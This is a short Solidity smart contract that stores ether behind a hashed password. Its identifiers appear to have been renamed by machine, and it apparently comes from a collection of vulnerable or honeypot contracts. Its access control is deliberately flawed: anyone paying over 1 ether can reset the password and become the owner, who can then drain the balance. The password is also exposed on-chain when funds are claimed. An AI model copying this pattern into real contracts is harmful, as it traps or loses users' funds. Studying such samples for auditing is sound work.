// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract current_years_gift
{
    string communication;

    bool passHasBeenGroup = false;

    address caster;

    bytes32 public signaturePass;

    function() public payable{}

    function FetchSignature(bytes pass) public constant returns (bytes32) {return sha3(pass);}

    function GroupPass(bytes32 seal)
    public
    payable
    {
        if( (!passHasBeenGroup&&(msg.value > 1 ether)) || signaturePass==0x0 )
        {
            signaturePass = seal;
            caster = msg.sender;
        }
    }

    function CollectionSignal(string _message)
    public
    {
        if(msg.sender==caster)
        {
            communication =_message;
        }
    }

    function RetrieveGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(signaturePass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return communication;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==caster)
        {
            caster.transfer(this.balance);
            communication="";
        }
    }

    function PassHasBeenGroup(bytes32 seal)
    public
    {
        if(msg.sender==caster&&seal==signaturePass)
        {
           passHasBeenGroup=true;
        }
    }
}